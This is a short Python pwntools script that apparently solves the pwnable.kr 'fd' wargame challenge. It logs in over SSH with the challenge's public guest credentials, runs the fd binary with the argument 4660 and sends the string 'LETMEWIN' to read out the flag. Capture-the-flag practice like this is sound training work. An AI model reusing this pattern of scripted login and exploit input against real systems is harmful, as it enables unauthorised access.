from pwn import *
pwn_ssh=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)
print (pwn_ssh.connected())
sh=pwn_ssh.process(argv=['fd','4660'],executable='./fd')
sh.sendline("LETMEWIN")
print (sh.recvall())


